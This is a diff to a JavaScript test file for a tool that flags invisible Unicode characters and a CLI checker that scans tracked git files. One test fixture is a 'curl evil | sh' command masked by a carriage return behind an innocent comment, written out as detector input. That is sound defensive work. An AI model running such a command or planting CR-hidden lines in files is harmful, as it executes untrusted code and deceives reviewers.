@@ -1,3 +1,8 @@
+import { execFileSync, spawnSync } from 'node:child_process'
+import { mkdtempSync, writeFileSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { join, resolve } from 'node:path'
+import process from 'node:process'
 import { describe, expect, it } from 'vitest'
 import { findInvisibleCharacters } from './invisible-unicode.mjs'
 
@@ -16,7 +21,7 @@ describe('findInvisibleCharacters', () => {
     it.each(
         withNames([
             0x200b, 0x200c, 0x200d, 0x2060, 0x2063, 0xfeff, 0x200e, 0x200f, 0x061c, 0x00ad, 0x034f, 0x3164, 0x115f,
-            0xffa0, 0xfe0f, 0xe0001, 0xe0041, 0xe007f, 0xe0100, 0xe01ef, 0x2028, 0x0007, 0x001b,
+            0xffa0, 0xfe0f, 0xe0001, 0xe0041, 0xe007f, 0xe0100, 0xe01ef, 0x2028, 0x2800, 0x0000, 0x0007, 0x001b,
         ]),
     )('reports the invisible character %s', (codePoint, cp) => {
         expect(findInvisibleCharacters(`a${String.fromCodePoint(cp)}b`)).toEqual([{ line: 1, column: 2, codePoint }])
@@ -32,9 +37,16 @@ describe('findInvisibleCharacters', () => {
         ])
     })
 
+    it('reports a carriage return that is not part of a line ending', () => {
+        expect(findInvisibleCharacters('curl evil | sh\r# update deps\r\n')).toEqual([
+            { line: 1, column: 15, codePoint: 'U+000D' },
+        ])
+    })
+
     it.each([
         'plain ASCII\twith a tab\n',
         'a\r\nb\r\n',
+        'no final newline\r',
         'caf\u00E9',
         '\u0395\u03BB\u03BB\u03B7\u03BD\u03B9\u03BA\u03AC',
         '\u65E5\u672C\u8A9E',
@@ -62,5 +74,36 @@ describe('findInvisibleCharacters', () => {
             { line: 1, column: 2, codePoint: 'U+202E' },
             { line: 1, column: 4, codePoint: 'U+2066' },
         ])
+    })
+})
+
+describe('bin/check-invisible-unicode.mjs', () => {
+    const runCheck = (files) => {
+        const dir = mkdtempSync(join(tmpdir(), 'invisible-unicode-'))
+        for (const [name, content] of Object.entries(files)) writeFileSync(join(dir, name), content)
+        execFileSync('git', ['init', '--quiet'], { cwd: dir, stdio: 'ignore' })
+        execFileSync('git', ['add', '--', ...Object.keys(files)], { cwd: dir })
+        return spawnSync(process.execPath, [resolve('bin/check-invisible-unicode.mjs')], { cwd: dir, encoding: 'utf8' })
+    }
+
+    it('passes clean tracked files', () => {
+        const { status, stdout } = runCheck({ 'CLAUDE.md': '# Rules\n' })
+        expect(status).toBe(0)
+        expect(stdout).toContain('No invisible Unicode characters in 1 tracked files')
+    })
+
+    it('still scans a text file that contains a NUL byte', () => {
+        const { status, stdout } = runCheck({ 'CLAUDE.md': 'Be helpful.\u202E\n\0' })
+        expect(status).toBe(1)
+        expect(stdout).toContain('::error file=CLAUDE.md,line=1,col=12::U+202E')
+        expect(stdout).toContain('::error file=CLAUDE.md,line=2,col=1::U+0000')
+    })
+
+    it('skips binary files by extension', () => {
+        expect(runCheck({ 'icon.png': '\0\u202E' }).status).toBe(0)
+    })
+
+    it('escapes the file name in the annotation', () => {
+        expect(runCheck({ 'a,b:c.md': '\u200B' }).stdout).toContain('::error file=a%2Cb%3Ac.md,line=1,col=1::U+200B')
     })
 })
